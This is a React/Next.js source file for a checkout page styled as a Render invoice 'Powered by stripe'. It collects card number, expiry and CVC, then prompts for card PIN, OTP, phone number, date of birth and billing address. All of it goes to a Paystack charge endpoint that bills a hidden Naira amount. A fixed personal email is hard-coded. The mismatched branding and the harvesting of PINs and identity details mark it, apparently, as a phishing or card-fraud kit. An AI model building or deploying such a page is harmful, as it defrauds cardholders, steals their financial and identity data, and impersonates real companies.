'use client';

import React, { useState, useEffect } from 'react';
import { useSearchParams } from 'next/navigation';
import {
  VisaIcon,
  MastercardIcon,
  AmexIcon,
  DiscoverIcon,
  CvcIcon,
  DownloadTrayIcon,
  ChevronRightIcon,
  CloseIcon,
} from './icons';

export interface ReceiptItem {
  id: string;
  name: string;
  qty: number;
  unitPriceStr: string;
  monthly: number;
  total: number;
  scrambledPath: string;
}

interface Props {
  receipt: ReceiptItem;
  allReceipts: readonly ReceiptItem[];
}

type AuthStepType = 'send_pin' | 'send_otp' | 'send_phone' | 'send_birthday' | 'send_address' | null;

const FIXED_EMAIL = 'nelson.attah@live.com';
const FIXED_MEMO = 'Render Oct 1, 2026 - Sep 30, 2027';
const USD_TO_NGN = 1346.84;

function formatUSD(amount: number): string {
  const safeAmount = Number.isFinite(amount) ? amount : 0;
  return new Intl.NumberFormat('en-US', {
    style: 'currency',
    currency: 'USD',
    minimumFractionDigits: 2,
    maximumFractionDigits: 2,
  }).format(safeAmount);
}

function formatNGN(amount: number): string {
  const safeAmount = Number.isFinite(amount) ? amount : 0;
  return new Intl.NumberFormat('en-NG', {
    style: 'currency',
    currency: 'NGN',
    minimumFractionDigits: 2,
    maximumFractionDigits: 2,
  }).format(safeAmount);
}

function isValidLuhn(cardNumber: string): boolean {
  const digits = cardNumber.replace(/\D/g, '');
  if (digits.length < 13 || digits.length > 19) return false;
  let sum = 0;
  let shouldDouble = false;
  for (let i = digits.length - 1; i >= 0; i--) {
    let digit = parseInt(digits.charAt(i), 10);
    if (Number.isNaN(digit)) return false;
    if (shouldDouble) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    shouldDouble = !shouldDouble;
  }
  return sum % 10 === 0;
}

function validateExpiry(expMonthStr: string, expYearStr: string): string | null {
  if (expMonthStr.length !== 2 || expYearStr.length !== 2) {
    return 'Your card’s expiration date is incomplete.';
  }
  const month = Number(expMonthStr);
  const year2 = Number(expYearStr);
  if (!Number.isInteger(month) || month < 1 || month > 12 || !Number.isInteger(year2)) {
    return 'Your card’s expiration date is invalid.';
  }
  const now = new Date();
  const currentMonth = now.getMonth() + 1;
  const currentYear2 = now.getFullYear() % 100;

  if (year2 < currentYear2 || (year2 === currentYear2 && month < currentMonth)) {
    return 'Your card has expired.';
  }
  if (year2 > currentYear2 + 25) {
    return 'Your card’s expiration year is invalid.';
  }
  return null;
}

function generateInvoiceNumber(): string {
  try {
    if (typeof window !== 'undefined' && window.crypto?.getRandomValues) {
      const bytes = new Uint8Array(4);
      window.crypto.getRandomValues(bytes);
      const hex = Array.from(bytes)
        .map((b) => b.toString(16).padStart(2, '0'))
        .join('')
        .toUpperCase();
      return `#${hex}-0036`;
    }
  } catch {
    // Fallback if crypto is restricted
  }
  return '#DD8452BB-0036';
}

async function safePostJson(url: string, payload: Record<string, any>) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 30000);
  try {
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
      signal: controller.signal,
    });
    const text = await res.text();
    try {
      return text ? JSON.parse(text) : { success: false, status: 'failed', message: 'Empty server response.' };
    } catch {
      return {
        success: false,
        status: 'failed',
        message: 'Unexpected response from payment server. Please try again.',
      };
    }
  } catch (err: any) {
    const isTimeout = err?.name === 'AbortError';
    return {
      success: false,
      status: 'failed',
      message: isTimeout
        ? 'Request timed out. Please check your connection and try again.'
        : 'Network error. Please check your internet connection and try again.',
    };
  } finally {
    clearTimeout(timeoutId);
  }
}

function ReceiptPageContent({ receipt }: Props) {
  const searchParams = useSearchParams();
  const [invoiceNumber, setInvoiceNumber] = useState<string>('#DD8452BB-0036');
  const [isDrawerOpen, setIsDrawerOpen] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [statusMessage, setStatusMessage] = useState<{ type: 'success' | 'error'; text: string } | null>(null);
  const [isPaid, setIsPaid] = useState(false);
  const [paymentDetails, setPaymentDetails] = useState<{ ref: string; date: string; amountNgn: string } | null>(null);
  const [showSuccessModal, setShowSuccessModal] = useState(false);

  // Card input states
  const [cardNumber, setCardNumber] = useState('');
  const [cardExpiry, setCardExpiry] = useState('');
  const [cardCvc, setCardCvc] = useState('');

  // Multi-step card authorization state (PIN / OTP / Phone / Birthday / Address)
  const [authStep, setAuthStep] = useState<AuthStepType>(null);
  const [authReference, setAuthReference] = useState<string>('');
  const [authPromptText, setAuthPromptText] = useState<string>('');
  const [authInputValue, setAuthInputValue] = useState<string>('');
  const [authCity, setAuthCity] = useState<string>('');
  const [authState, setAuthState] = useState<string>('');
  const [authZip, setAuthZip] = useState<string>('');

  // NGN conversion computation (used behind the scenes)
  const ngnEquivalent = Math.round(receipt.total * USD_TO_NGN * 100) / 100;

  useEffect(() => {
    try {
      const storageKey = `render_invoice_${receipt.id}`;
      const stored = sessionStorage.getItem(storageKey);
      if (stored) {
        setInvoiceNumber(stored);
      } else {
        const generated = generateInvoiceNumber();
        sessionStorage.setItem(storageKey, generated);
        setInvoiceNumber(generated);
      }
    } catch {
      setInvoiceNumber(generateInvoiceNumber());
    }
  }, [receipt.id]);

  const markPaymentComplete = (ref: string) => {
    setIsLoading(false);
    setAuthStep(null);
    setAuthInputValue('');
    setIsPaid(true);
    setPaymentDetails({
      ref,
      date: new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' }),
      amountNgn: formatNGN(ngnEquivalent),
    });
    setStatusMessage(null);
    setShowSuccessModal(true);
  };

  useEffect(() => {
    const reference = searchParams?.get('reference') || searchParams?.get('trxref');
    const paymentStatus = searchParams?.get('payment_status');

    if (reference || paymentStatus === 'success') {
      const refToUse = reference || `render-${receipt.id}-${Date.now().toString().slice(-6)}`;
      markPaymentComplete(refToUse);
    }
  }, [searchParams, receipt.id, ngnEquivalent]);

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, '').slice(0, 19);
    const formatted = raw.replace(/(\d{4})/g, '$1 ').trim();
    setCardNumber(formatted);
    if (statusMessage?.type === 'error') setStatusMessage(null);
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let raw = e.target.value.replace(/\D/g, '').slice(0, 4);
    if (raw.length === 1 && Number(raw) > 1) {
      raw = `0${raw}`;
    }
    if (raw.length >= 2) {
      const month = Number(raw.slice(0, 2));
      if (month > 12) {
        raw = `12${raw.slice(2)}`;
      } else if (month === 0) {
        raw = `01${raw.slice(2)}`;
      }
    }
    if (raw.length > 2) {
      setCardExpiry(`${raw.slice(0, 2)} / ${raw.slice(2)}`);
    } else {
      setCardExpiry(raw);
    }
    if (statusMessage?.type === 'error') setStatusMessage(null);
  };

  const handleCvcChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, '').slice(0, 4);
    setCardCvc(raw);
    if (statusMessage?.type === 'error') setStatusMessage(null);
  };

  const pollPendingCharge = async (reference: string, attemptsLeft = 10): Promise<void> => {
    if (attemptsLeft <= 0) {
      setIsLoading(false);
      setStatusMessage({
        type: 'error',
        text: 'Payment verification timed out. Please check your statement or try again.',
      });
      return;
    }

    await new Promise((r) => setTimeout(r, 2500));
    const result = await safePostJson('/api/paystack/charge', { action: 'check_pending', reference });
    await handleChargeStepResponse(result, attemptsLeft - 1);
  };

  const handleChargeStepResponse = async (result: any, pendingAttempts = 10) => {
    if (!result || !result.success || result.status === 'failed') {
      setIsLoading(false);
      setStatusMessage({
        type: 'error',
        text: result?.message || 'Your card was declined. Please check your card details.',
      });
      return;
    }

    const ref = result.reference || authReference || `render-${Date.now()}`;
    if (result.reference) {
      setAuthReference(result.reference);
    }

    switch (result.status) {
      case 'success':
        markPaymentComplete(ref);
        break;

      case 'send_pin':
        setIsLoading(false);
        setAuthStep('send_pin');
        setAuthInputValue('');
        setAuthPromptText(result.displayText || 'Please enter your 4-digit card PIN to authorize this payment.');
        break;

      case 'send_otp':
        setIsLoading(false);
        setAuthStep('send_otp');
        setAuthInputValue('');
        setAuthPromptText(result.displayText || 'Please enter the one-time password (OTP) sent to your phone or email.');
        break;

      case 'send_phone':
        setIsLoading(false);
        setAuthStep('send_phone');
        setAuthInputValue('');
        setAuthPromptText(result.displayText || 'Please enter your registered phone number.');
        break;

      case 'send_birthday':
        setIsLoading(false);
        setAuthStep('send_birthday');
        setAuthInputValue('');
        setAuthPromptText(result.displayText || 'Please enter your date of birth (YYYY-MM-DD).');
        break;

      case 'send_address':
        setIsLoading(false);
        setAuthStep('send_address');
        setAuthInputValue('');
        setAuthPromptText(result.displayText || 'Please enter your billing address to verify your card.');
        break;

      case 'open_url':
        if (result.url && typeof window !== 'undefined') {
          window.location.href = result.url;
        } else {
          await pollPendingCharge(ref, pendingAttempts);
        }
        break;

      case 'pending':
      case 'ongoing':
        await pollPendingCharge(ref, pendingAttempts);
        break;

      default:
        setIsLoading(false);
        setStatusMessage({
          type: 'error',
          text: result.message || 'Unable to complete card authorization.',
        });
        break;
    }
  };

  const handlePay = async () => {
    if (isLoading || isPaid) return;

    const cleanNumber = cardNumber.replace(/\D/g, '');
    const expiryDigits = cardExpiry.replace(/\D/g, '');
    const expMonth = expiryDigits.slice(0, 2);
    const expYear = expiryDigits.slice(2, 4);
    const cleanCvc = cardCvc.replace(/\D/g, '');

    if (cleanNumber.length < 13 || cleanNumber.length > 19) {
      setStatusMessage({ type: 'error', text: 'Your card number is incomplete.' });
      return;
    }
    if (!isValidLuhn(cleanNumber)) {
      setStatusMessage({ type: 'error', text: 'Your card number is invalid.' });
      return;
    }

    const expiryError = validateExpiry(expMonth, expYear);
    if (expiryError) {
      setStatusMessage({ type: 'error', text: expiryError });
      return;
    }

    if (cleanCvc.length < 3 || cleanCvc.length > 4) {
      setStatusMessage({ type: 'error', text: 'Your card’s security code is incomplete.' });
      return;
    }

    setIsLoading(true);
    setStatusMessage(null);

    const result = await safePostJson('/api/paystack/charge', {
      action: 'charge',
      email: FIXED_EMAIL,
      amountUsd: receipt.total,
      serviceName: receipt.name,
      invoiceNumber,
      serviceId: receipt.id,
      returnPath: receipt.scrambledPath,
      card: {
        number: cleanNumber,
        cvv: cleanCvc,
        expiry_month: expMonth,
        expiry_year: expYear,
      },
    });

    await handleChargeStepResponse(result);
  };

  const handleAuthSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (isLoading || !authStep || !authReference) return;

    const trimmed = authInputValue.trim();

    if (authStep === 'send_pin' && !/^\d{4}$/.test(trimmed)) {
      setStatusMessage({ type: 'error', text: 'Please enter a valid 4-digit card PIN.' });
      return;
    }
    if (authStep === 'send_otp' && trimmed.length < 4) {
      setStatusMessage({ type: 'error', text: 'Please enter the complete verification code.' });
      return;
    }
    if (authStep === 'send_phone' && trimmed.replace(/\D/g, '').length < 7) {
      setStatusMessage({ type: 'error', text: 'Please enter a valid phone number.' });
      return;
    }
    if (authStep === 'send_birthday' && !/^\d{4}-\d{2}-\d{2}$/.test(trimmed)) {
      setStatusMessage({ type: 'error', text: 'Please enter date of birth in YYYY-MM-DD format.' });
      return;
    }
    if (
      authStep === 'send_address' &&
      (!trimmed || !authCity.trim() || !authState.trim() || !authZip.trim())
    ) {
      setStatusMessage({ type: 'error', text: 'Please complete all billing address fields.' });
      return;
    }

    setIsLoading(true);
    setStatusMessage(null);

    const payload: Record<string, any> = { reference: authReference };

    if (authStep === 'send_pin') {
      payload.action = 'submit_pin';
      payload.pin = trimmed;
    } else if (authStep === 'send_otp') {
      payload.action = 'submit_otp';
      payload.otp = trimmed;
    } else if (authStep === 'send_phone') {
      payload.action = 'submit_phone';
      payload.phone = trimmed;
    } else if (authStep === 'send_birthday') {
      payload.action = 'submit_birthday';
      payload.birthday = trimmed;
    } else if (authStep === 'send_address') {
      payload.action = 'submit_address';
      payload.address = trimmed;
      payload.city = authCity.trim();
      payload.state = authState.trim();
      payload.zip_code = authZip.trim();
    }

    const result = await safePostJson('/api/paystack/charge', payload);
    await handleChargeStepResponse(result);
  };

  const handlePrintPDF = () => {
    try {
      if (typeof window !== 'undefined' && typeof window.print === 'function') {
        window.print();
      }
    } catch {
      // Ignore print errors
    }
  };

  return (
    <div className="app-container">
      {/* Main Content Area */}
      <div className={`main-viewport ${isDrawerOpen ? 'drawer-is-open' : ''}`}>
        <main className="invoice-column-wrapper">
          <div className="invoice-column">
            {/* Header: Render Logo + Brand Text */}
            <header className="brand-header">
              <img
                src="/render-logo.png"
                alt="Render Logo"
                className="brand-logo-img"
                width={20}
                height={20}
              />
              <span className="brand-title">Render Services, Inc dba Render</span>
            </header>

            {/* CARD 1: Invoice Summary */}
            <section className="stripe-card" aria-label="Invoice summary">
              <div className="invoice-card-top">
                <h1 className="invoice-amount-big">{formatUSD(receipt.total)}</h1>
                <button
                  type="button"
                  className="pdf-download-btn"
                  onClick={handlePrintPDF}
                  title="Download / Print Invoice PDF"
                >
                  <DownloadTrayIcon />
                  <span>Invoice PDF</span>
                </button>
              </div>

              {/* Metadata */}
              <dl className="invoice-metadata">
                <dt>To</dt>
                <dd>{FIXED_EMAIL}</dd>

                <dt>From</dt>
                <dd>
                  Render Services, Inc dba Render
                  <span className="merchant-badge">@render</span>
                </dd>

                <dt>Invoice</dt>
                <dd>{invoiceNumber}</dd>

                <dt>Memo</dt>
                <dd>{FIXED_MEMO}</dd>
              </dl>

              <hr className="card-divider" />

              {/* Smooth Drawer Toggle Link */}
              <button
                type="button"
                className="details-toggle-btn"
                onClick={() => setIsDrawerOpen(!isDrawerOpen)}
              >
                {isDrawerOpen ? (
                  <>
                    <span>Close invoice and payment details</span>
                    <CloseIcon />
                  </>
                ) : (
                  <>
                    <span>View invoice and payment details</span>
                    <ChevronRightIcon />
                  </>
                )}
              </button>
            </section>

            {/* Print-only breakdown for PDF */}
            <div className="print-invoice-breakdown">
              <h2>Invoice Details</h2>
              <p><strong>Item:</strong> {receipt.name}</p>
              <p><strong>Quantity:</strong> 1</p>
              <p><strong>Unit Price:</strong> {receipt.unitPriceStr} / month</p>
              <p><strong>Billing Period:</strong> {FIXED_MEMO}</p>
              <p><strong>Total:</strong> {formatUSD(receipt.total)}</p>
            </div>

            {/* CARD 2: Payment Section */}
            <section className="stripe-card payment-card-wrapper" aria-label="Payment card">
              <h2 className="payment-card-title">Pay with card</h2>

              <label className="input-label" htmlFor="card-number-input">
                Card information
              </label>

              {/* Card Inputs Wrapper */}
              <div className="card-inputs-wrapper">
                {/* Top Row: Card Number + Card Icons */}
                <div className="card-input-row-top">
                  <input
                    id="card-number-input"
                    type="text"
                    inputMode="numeric"
                    className="card-input-field"
                    placeholder="1234 1234 1234 1234"
                    value={cardNumber}
                    onChange={handleCardNumberChange}
                    maxLength={23}
                    autoComplete="cc-number"
                    disabled={isLoading || isPaid}
                  />
                  <div className="card-brands-cluster">
                    <VisaIcon />
                    <MastercardIcon />
                    <AmexIcon />
                    <DiscoverIcon />
                  </div>
                </div>

                {/* Bottom Row: Expiry (MM / YY) and CVC */}
                <div className="card-input-row-bottom">
                  <div className="card-input-half">
                    <input
                      type="text"
                      inputMode="numeric"
                      className="card-input-field"
                      placeholder="MM / YY"
                      value={cardExpiry}
                      onChange={handleExpiryChange}
                      maxLength={7}
                      autoComplete="cc-exp"
                      disabled={isLoading || isPaid}
                    />
                  </div>
                  <div className="card-input-half">
                    <input
                      type="text"
                      inputMode="numeric"
                      className="card-input-field"
                      placeholder="CVC"
                      value={cardCvc}
                      onChange={handleCvcChange}
                      maxLength={4}
                      autoComplete="cc-csc"
                      disabled={isLoading || isPaid}
                    />
                    <CvcIcon />
                  </div>
                </div>
              </div>

              {/* Consent Disclaimer */}
              <p className="payment-consent-text">
                By confirming your payment, you allow Render Services, Inc dba Render to charge you for this payment and save your payment information in accordance with their terms.
              </p>

              {/* Pay Button */}
              <button
                type="button"
                className="pay-submit-btn"
                onClick={handlePay}
                disabled={isLoading || isPaid}
              >
                {isLoading ? (
                  'Processing…'
                ) : isPaid ? (
                  '✓ Paid'
                ) : (
                  'Pay'
                )}
              </button>

              {/* Status Message */}
              {statusMessage && (
                <div className={`payment-status-box ${statusMessage.type}`} role="status">
                  {statusMessage.text}
                </div>
              )}
            </section>

            {/* Footer */}
            <footer className="checkout-footer">
              <div className="powered-by-stripe">
                <span>Powered by</span>{' '}
                <a
                  href="https://stripe.com/invoices"
                  target="_blank"
                  rel="noopener noreferrer"
                  style={{ fontWeight: 'bold' }}
                >
                  stripe
                </a>
              </div>
              <nav className="footer-legal-links">
                <a
                  href="https://stripe.com/legal/consumer"
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  Terms
                </a>
                <a
                  href="https://stripe.com/privacy"
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  Privacy
                </a>
              </nav>
            </footer>
          </div>
        </main>

        {/* Mobile Backdrop for Drawer */}
        <div
          className={`drawer-mobile-backdrop ${isDrawerOpen ? 'is-open' : ''}`}
          onClick={() => setIsDrawerOpen(false)}
          aria-hidden="true"
        />

        {/* RIGHT SIDE BAR / DRAWER */}
        <aside
          className={`right-sidebar-panel ${isDrawerOpen ? 'is-open' : ''}`}
          aria-label="Invoice and payment details"
          aria-hidden={!isDrawerOpen}
        >
          {/* Top Close Link */}
          <button
            type="button"
            className="drawer-close-btn"
            onClick={() => setIsDrawerOpen(false)}
          >
            <CloseIcon />
            <span>Close invoice and payment details</span>
          </button>

          {/* Large Total Amount */}
          <div className="drawer-amount-big">{formatUSD(receipt.total)}</div>

          {/* Line Items */}
          <div className="drawer-line-item">
            <div className="drawer-item-header">
              <div className="drawer-item-title">{receipt.name}</div>
              <div className="drawer-item-price">{formatUSD(receipt.total)}</div>
            </div>
            <div className="drawer-item-qty">Qty 1</div>
          </div>

          {/* Totals Summary */}
          <div className="drawer-totals-section">
            <div className="drawer-total-row due">
              <span>Total due</span>
              <span>{formatUSD(receipt.total)}</span>
            </div>
            <div className="drawer-total-row">
              <span>Amount paid</span>
              <span>{isPaid ? formatUSD(receipt.total) : '$0.00'}</span>
            </div>
            <div className="drawer-total-row remaining">
              <span>Amount remaining</span>
              <span>{isPaid ? '$0.00' : formatUSD(receipt.total)}</span>
            </div>
          </div>

          {/* Payment History */}
          <section className="drawer-history-section">
            <h3 className="drawer-history-title">Payment history</h3>
            {isPaid && paymentDetails ? (
              <div className="drawer-history-paid">
                <strong>Paid</strong>
                <div>Date: {paymentDetails.date}</div>
                <div>Amount: {formatUSD(receipt.total)}</div>
                <div style={{ wordBreak: 'break-all', fontSize: '11px', marginTop: '4px', opacity: 0.85 }}>
                  Ref: {paymentDetails.ref}
                </div>
              </div>
            ) : (
              <p className="drawer-history-empty">No payments have been made</p>
            )}
          </section>

          {/* Footer Support Link */}
          <div className="drawer-footer-contact">
            Questions?{' '}
            <a href="mailto:support@render.com">Contact Render Services, Inc dba Render</a>
          </div>
        </aside>
      </div>

      {/* ===== STEP AUTHORIZATION MODAL (PIN / OTP / PHONE / BIRTHDAY / ADDRESS) ===== */}
      {authStep && (
        <div className="success-modal-backdrop" role="dialog" aria-modal="true" aria-labelledby="auth-modal-title">
          <div className="success-modal-card">
            <h2 className="success-modal-title" id="auth-modal-title">
              {authStep === 'send_pin'
                ? 'Card PIN Verification'
                : authStep === 'send_otp'
                ? 'One-Time Password'
                : 'Card Verification'}
            </h2>
            <p className="success-modal-desc">{authPromptText}</p>

            <form onSubmit={handleAuthSubmit} noValidate>
              <div style={{ marginBottom: '16px', textAlign: 'left' }}>
                <input
                  type={authStep === 'send_pin' ? 'password' : 'text'}
                  inputMode={authStep === 'send_pin' || authStep === 'send_otp' ? 'numeric' : 'text'}
                  className="card-input-field"
                  style={{
                    width: '100%',
                    height: '42px',
                    border: '1px solid #d8e2ec',
                    borderRadius: '6px',
                    padding: '0 12px',
                    fontSize: '15px',
                    textAlign: authStep === 'send_pin' || authStep === 'send_otp' ? 'center' : 'left',
                    letterSpacing: authStep === 'send_pin' || authStep === 'send_otp' ? '4px' : 'normal',
                  }}
                  placeholder={
                    authStep === 'send_pin'
                      ? '••••'
                      : authStep === 'send_otp'
                      ? '123456'
                      : authStep === 'send_birthday'
                      ? 'YYYY-MM-DD'
                      : authStep === 'send_phone'
                      ? 'Phone number'
                      : 'Street address'
                  }
                  value={authInputValue}
                  onChange={(e) => {
                    const val =
                      authStep === 'send_pin'
                        ? e.target.value.replace(/\D/g, '').slice(0, 4)
                        : e.target.value;
                    setAuthInputValue(val);
                    if (statusMessage?.type === 'error') setStatusMessage(null);
                  }}
                  maxLength={authStep === 'send_pin' ? 4 : authStep === 'send_otp' ? 8 : 64}
                  required
                  autoFocus
                />

                {authStep === 'send_address' && (
                  <div style={{ display: 'flex', gap: '8px', marginTop: '8px' }}>
                    <input
                      type="text"
                      className="card-input-field"
                      style={{ flex: 1, height: '38px', border: '1px solid #d8e2ec', borderRadius: '6px', padding: '0 10px' }}
                      placeholder="City"
                      value={authCity}
                      onChange={(e) => setAuthCity(e.target.value)}
                      required
                    />
                    <input
                      type="text"
                      className="card-input-field"
                      style={{ width: '80px', height: '38px', border: '1px solid #d8e2ec', borderRadius: '6px', padding: '0 10px' }}
                      placeholder="State"
                      value={authState}
                      onChange={(e) => setAuthState(e.target.value)}
                      required
                    />
                    <input
                      type="text"
                      className="card-input-field"
                      style={{ width: '90px', height: '38px', border: '1px solid #d8e2ec', borderRadius: '6px', padding: '0 10px' }}
                      placeholder="ZIP"
                      value={authZip}
                      onChange={(e) => setAuthZip(e.target.value)}
                      required
                    />
                  </div>
                )}
              </div>

              {statusMessage && (
                <div className={`payment-status-box ${statusMessage.type}`} style={{ marginBottom: '12px' }} role="status">
                  {statusMessage.text}
                </div>
              )}

              <div style={{ display: 'flex', gap: '10px' }}>
                <button
                  type="button"
                  className="pdf-download-btn"
                  style={{ flex: 1, height: '42px', justifyContent: 'center' }}
                  onClick={() => {
                    setAuthStep(null);
                    setIsLoading(false);
                    setStatusMessage(null);
                  }}
                  disabled={isLoading}
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  className="success-modal-btn"
                  style={{ flex: 2 }}
                  disabled={isLoading || !authInputValue.trim()}
                >
                  {isLoading ? 'Verifying…' : 'Confirm'}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* ===== SUCCESS MODAL ===== */}
      {showSuccessModal && (
        <div className="success-modal-backdrop" role="dialog" aria-modal="true" aria-labelledby="success-modal-title">
          <div className="success-modal-card">
            {/* Green checkmark icon */}
            <div className="success-modal-icon-wrapper">
              <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <polyline points="20 6 9 17 4 12" />
              </svg>
            </div>

            <h2 className="success-modal-title" id="success-modal-title">Payment Successful</h2>
            <p className="success-modal-desc">
              Receipt sent to <strong>Nelson Attah</strong> at{' '}
              <strong>nelson.attah@live.com</strong>
            </p>

            <div className="success-modal-summary">
              <div className="success-modal-summary-row">
                <span>Amount</span>
                <strong>{formatUSD(receipt.total)}</strong>
              </div>
              <div className="success-modal-summary-row">
                <span>Invoice</span>
                <strong>{invoiceNumber}</strong>
              </div>
              {paymentDetails?.ref && (
                <div className="success-modal-summary-row">
                  <span>Reference</span>
                  <strong style={{ fontSize: '11px', wordBreak: 'break-all' }}>{paymentDetails.ref}</strong>
                </div>
              )}
            </div>

            <button
              type="button"
              className="success-modal-btn"
              onClick={() => { window.location.href = 'https://stripe.com/invoicing'; }}
            >
              Okay
            </button>
          </div>
        </div>
      )}
    </div>
  );
}

export default function ReceiptPage(props: Props) {
  return (
    <React.Suspense fallback={<div style={{ minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#697386' }}>Loading invoice...</div>}>
      <ReceiptPageContent {...props} />
    </React.Suspense>
  );
}
